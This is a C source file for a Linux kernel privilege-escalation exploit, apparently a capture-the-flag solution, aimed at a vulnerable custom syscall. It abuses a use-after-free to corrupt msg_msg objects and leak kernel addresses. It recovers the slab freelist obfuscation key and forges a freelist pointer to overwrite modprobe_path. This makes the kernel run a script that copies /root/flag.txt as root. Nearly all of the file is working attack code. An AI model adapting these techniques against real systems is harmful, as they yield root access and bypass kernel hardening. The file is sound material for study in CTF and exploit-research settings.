#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>

typedef struct userdata {
  int idx;
  unsigned short priority;
  char *data;
};

typedef struct
{
    long mtype;
    char mtext[0x1000];
} msg;

msg msgbuf;

#define __NR_IPS 548

void alloc_storage(char *data);
void remove_storage(int idx);
void edit_storage(int idx, char *data);
void copy_storage(int idx);
void analyse_leaks(long * ptr);
void leak_rand_vals(long * ptr);
void final_overwrite();

long swab(long addr)
{
    return \
    ((addr & (0x00000000000000ffULL)) << 56) |   \
    ((addr & (0x000000000000ff00ULL)) << 40) |   \
    ((addr & (0x0000000000ff0000ULL)) << 24) |   \
    ((addr & (0x00000000ff000000ULL)) <<  8) |   \
    ((addr & (0x000000ff00000000ULL)) >>  8) |   \
    ((addr & (0x0000ff0000000000ULL)) >> 24) |   \
    ((addr & (0x00ff000000000000ULL)) >> 40) |   \
    ((addr & (0xff00000000000000ULL)) >> 56);
}

// chunks offset from kernel_base = 0x1cec8c0
unsigned long kernel_base = 0;
unsigned long modprobe_path = 0;
unsigned long rand_xor_val = 0;
unsigned long good_idx = -2;
unsigned long msg_msg_addr = 0;
unsigned long s_random = 0;
unsigned long next_chunk_addr[0x10] = {0}, offsets[0x10] = {0};
char buf[0x4000];
//--------------------------------------------------------------------------------------------------------------------------------------
int main()
{
    puts("[+] Setup for modprobe_path exploit");

    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");

	int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (qid == -1)  exit(puts("[!] Error: Create msg queue failed."));

    puts("[+] Filling the storage to full.");
    memset(buf, 0x41, 10);
    buf[10] = 0;
    for (int i = 0; i < 0x10 ; i++)
    {
        buf[2] = 0x70 + i;
        alloc_storage(buf);
    }

    puts("[+] Chunk free'd and copy kept for later UAF.");
    copy_storage(0);
    remove_storage(0);

    puts("[+] First msg out.");
    msgbuf.mtype = 1;
    memset(msgbuf.mtext, 0, 0x80);
    msgsnd(qid, &msgbuf, 0x80-0x30, 0);

    puts("[+] Edited msg_msg chunk using UAF on index -1.");
    buf[0] = buf[1] = 0xff;
    memset(buf + 2, 0x31, 0x10);
    buf[0x30] = 0;
    edit_storage(-1, buf);

    memset(buf, 0, 0x4000);
    msgrcv(qid, buf, 0x3131313131313131, 0x3131313131313131, 0);
    unsigned long * l_ptr = buf + 8;
    
    puts("[+] Analysing leaks info now.");
    analyse_leaks(l_ptr);

    printf("[+] kernel_base: %p\n", kernel_base);
    printf("[+] modprobe_path addr: %p\n", modprobe_path);
    // for (int i = 0 ; i < 0x10 ; i++)    printf("0x%lx: 0x%016lx\t0x%06lx\n", i, next_chunk_addr[i], offsets[i]*8);
    for (int i = 0 ; i < 0xf ; i++)
    {
        if (next_chunk_addr[i] && next_chunk_addr[i+1])
        {
            good_idx = i;
            break;
        }
    }
    if (good_idx < 0 || kernel_base == 0)
    {
        puts("[-] No consecutive chunks found. Exiting.");
        exit(-1);
    }

    leak_rand_vals(l_ptr);

    printf("[+] msg_msg_addr: %p\n", msg_msg_addr);
    printf("[+] s->random: %p\n", s_random);

    puts("[+] Finally overwrite modprobe_path.");
    final_overwrite();

    puts("[+] Trigger modprobe_path exploit");
    system("/home/user/dummy");
    system("/bin/cat /home/user/flag");
    // for (int i = 0; i < (0x1000>>3) ; i+=0x2)    printf("0x%04lx:\t0x%016lx\t0x%016lx\n", msg_msg_addr + 0x30 + i*8, l_ptr[i], l_ptr[i + 1]);
    return 0;
}
//--------------------------------------------------------------------------------------------------------------------------------------
void alloc_storage(char *data)
{
    struct userdata userdata;
    
    userdata.priority = 1;
    userdata.data = data;

    syscall(__NR_IPS, 1, &userdata);
}

void remove_storage(int idx)
{
    struct userdata userdata;
    
    userdata.idx = idx;

    syscall(__NR_IPS, 2, &userdata);
}

void edit_storage(int idx, char *data)
{
    struct userdata userdata;
    
    userdata.idx = idx;
    userdata.data = data;

    syscall(__NR_IPS, 3, &userdata);
}

void copy_storage(int idx)
{
    struct userdata userdata;
    
    userdata.idx = idx;

    syscall(__NR_IPS, 4, &userdata);
}

void analyse_leaks(long * p)
{
    for (int i = 0; i < (0x4000/8) ; i++)
    {
        if ((p[i] & 0xffff) == 0x1600)
        {
            kernel_base = p[i] - 0xa11600;
            modprobe_path = kernel_base + 0x144fa20;
            break;
        }
    }
    for (int i = 0; i < (0x4000/8) ; i+=2)
    {
        if (((p[i] & 0xfffffffffffffff0) == 0x4141414141414170))
        {
            next_chunk_addr[p[i] & 0xf] = p[i-2];
            offsets[p[i] & 0xf] = i-2;
        }
    }
}

void leak_rand_vals(long * p)
{
    msg_msg_addr = next_chunk_addr[good_idx] - offsets[good_idx + 1]*8 - 0x30;

    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    if (qid == -1)  exit(puts("[!] Error: Create msg queue failed."));
    
    puts("[+] Second msg out.");
    msgbuf.mtype = 1;
    memset(msgbuf.mtext, 0, 0x80);
    msgsnd(qid, &msgbuf, 0x80-0x30, 0);

    remove_storage(good_idx + 1);
    remove_storage(good_idx);

    puts("[+] Edited msg_msg chunk using UAF on index -1.");
    buf[0] = buf[1] = 0xff;
    memset(buf + 2, 0x31, 0x10);
    buf[0x30] = 0;
    edit_storage(-1, buf);

    memset(buf, 0, 0x4000);
    msgrcv(qid, buf, 0x3131313131313131, 0x3131313131313131, 0);

    // printf("[+] %p %p\n", msg_msg_addr + 0x30 + offsets[good_idx]*8, msg_msg_addr + 0x30 + offsets[good_idx + 1]*8);
    // printf("[+] %p %p\n", p[offsets[good_idx] + 8], p[offsets[good_idx + 1] + 8]);

    long obfuscated_ptr = p[offsets[good_idx] + 8];
    long next_free = msg_msg_addr + 0x30 + offsets[good_idx + 1]*8;
    long ptr_addr = msg_msg_addr + 0x30 + offsets[good_idx]*8 + 0x40;
    s_random = obfuscated_ptr ^ next_free ^ swab(ptr_addr);
}

void final_overwrite()
{
    long next_free = modprobe_path - 0x10;//0x1337133713371337;// Address in panic trace is always -> 0x93301337133714f7
    long ptr_addr = msg_msg_addr + 0x40;
    long obfuscated_ptr = next_free ^ s_random ^ swab(ptr_addr);
    memset(buf, 0x41, 0x32);
    *(long *)(buf + 0x32) = obfuscated_ptr;
    buf[0x40] = 0;
    edit_storage(-1, buf);

    alloc_storage("JUNK_THIS_LEET_NEXT :)");
    alloc_storage("AA/home/user/copy.sh");
}